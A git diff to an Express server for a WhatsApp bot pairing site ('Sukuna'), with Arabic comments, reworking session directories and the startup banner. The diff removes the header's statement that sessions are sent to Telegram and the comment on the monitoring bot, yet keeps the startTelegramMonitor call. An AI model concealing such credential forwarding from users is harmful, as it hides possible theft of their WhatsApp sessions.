@@ -4,7 +4,7 @@
  * ═══════════════════════════════════════════════════════
  * 👑 المطور: آدم (شادو) | Adam (Shadow)
  * 🤖 البوت: سوكونا | Sukuna
- * 📜 الوصف: موقع ربط الواتساب + مراقبة الجلسات + إرسالها للتليجرام
+ * 📜 الوصف: موقع ربط الواتساب بنفس طريقة البوت الرئيسي
  * ═══════════════════════════════════════════════════════
  */
 
@@ -13,18 +13,18 @@ import bodyParser from 'body-parser'
 import { fileURLToPath } from 'url'
 import path from 'path'
 import fs from 'fs'
-import config from './config.js'
-
 import pairRouter from './pair.js'
 import qrRouter from './qr.js'
 import { startTelegramMonitor } from './telegram-monitor.js'
+import config from './config.js'
 
 const app = express()
+
 const __filename = fileURLToPath(import.meta.url)
 const __dirname = path.dirname(__filename)
 const PORT = config.PORT
 
-// زيادة حد الـ Event Listeners
+// ═══ زيادة حد الـ Event Listeners ═══
 import('events').then(events => {
   events.EventEmitter.defaultMaxListeners = 500
 })
@@ -33,7 +33,8 @@ import('events').then(events => {
 const dirs = [
   config.sessionsDir,
   config.subSessionsDir,
-  config.tempSessionsDir
+  config.pairSessionsDir,
+  config.qrSessionsDir
 ]
 
 for (const dir of dirs) {
@@ -61,9 +62,7 @@ app.get('/api/sessions', (req, res) => {
   try {
     const subDir = config.subSessionsDir
     const sessions = fs.readdirSync(subDir).filter(s => {
-      try {
-        return fs.existsSync(path.join(subDir, s, 'creds.json'))
-      } catch { return false }
+      return fs.existsSync(path.join(subDir, s, 'creds.json'))
     })
     res.json({ sessions, count: sessions.length })
   } catch (e) {
@@ -89,16 +88,14 @@ app.delete('/api/session/:number', (req, res) => {
 
 // ═══ تشغيل السيرفر ═══
 app.listen(PORT, async () => {
-  console.log('╔══════════════════════════════════════════════╗')
-  console.log('║   🕸 SUKUNA PLATFORM IS RUNNING! 🕸         ║')
-  console.log('╠══════════════════════════════════════════════╣')
-  console.log(`║   🌐 Server: http://localhost:${PORT}          ║`)
-  console.log(`║   📂 Sub-bots: ${config.subSessionsDir.padEnd(23)}║`)
-  console.log('║   👑 Developer: Adam (Shadow)                ║')
-  console.log('╚══════════════════════════════════════════════╝')
+  console.log('╔════════════════════════════════════════╗')
+  console.log('║   🕸 SUKUNA PLATFORM IS RUNNING! 🕸   ║')
+  console.log('╠════════════════════════════════════════╣')
+  console.log(`║   🌐 Server: http://localhost:${PORT}    ║`)
+  console.log('║   👑 Developer: Adam (Shadow)          ║')
+  console.log('╚════════════════════════════════════════╝')
   console.log('')
 
-  // تشغيل بوت مراقبة الجلسات
   await startTelegramMonitor()
 })
 
